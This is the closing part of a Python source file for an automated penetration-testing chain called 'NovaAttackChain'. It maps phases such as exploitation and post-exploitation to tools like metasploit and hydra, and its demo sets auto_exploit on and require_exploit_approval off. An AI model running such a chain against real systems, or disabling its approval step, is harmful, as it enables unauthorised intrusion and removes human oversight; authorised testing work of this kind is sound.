            return ["recon", "scanning", "vuln_analysis", "exploitation", "post_exploitation", "reporting"]

        # Default — safe scan
        return ["recon", "scanning", "vuln_analysis", "reporting"]

    def _check_dependencies(self, phases: List[str]):
        """Check and install required tools for phases"""
        tools_per_phase = {
            "recon":          ["whois", "dig", "nslookup"],
            "scanning":       ["nmap", "nikto", "gobuster"],
            "vuln_analysis":  ["nmap", "nikto", "sslscan"],
            "exploitation":   ["metasploit", "hydra"],
            "post_exploitation": ["curl", "grep"],
        }

        needed = []
        for phase in phases:
            needed.extend(tools_per_phase.get(phase, []))

        if HAS_DEP_MANAGER and needed:
            report = self.dep_manager.check_tools(list(set(needed)))
            missing = [s.name for s in report.missing]
            if missing:
                print(f"[!] Missing tools: {missing}")

    def _extract_services(self, phase_result: PhaseResult) -> Dict[int, str]:
        """Extract services from scanning phase result"""
        services = {}
        for vector in phase_result.attack_vectors:
            if vector.port:
                services[vector.port] = vector.service
        return services


# ──────────────────────────────────────────────
# DEMO
# ──────────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 55)
    print("NOVA ATTACK CHAIN — DEMO")
    print("=" * 55)

    # dry_run=True — no real commands executed
    chain = NovaAttackChain(
        dry_run=True,
        require_exploit_approval=False,
        auto_exploit=True
    )

    print("\n[1] Running full chain (dry run)...")
    result = chain.run(
        "192.168.1.1",
        authorization_note="Lab environment — authorized"
    )

    print(f"\n[2] Chain complete:")
    print(f"    Duration : {result.total_duration}s")
    print(f"    Phases   : {len(result.phases_run)}")
    print(f"    Vectors  : {len(result.attack_vectors)}")

    print("\n[3] From natural language:")
    result2 = chain.run_from_task(
        "scan 10.0.0.5 for open ports and web vulnerabilities",
        authorization_note="Authorized test"
    )

    print("\n[4] Quick scan shortcut:")
    result3 = chain.quick_scan("192.168.1.100")

    print("\nIntegration:")
    print("  from nova_attack_chain import NovaAttackChain")
    print("  chain = NovaAttackChain()")
    print("  result = chain.run('192.168.1.1')")
    print("  result = chain.run_from_task('test target.com for vulnerabilities')")
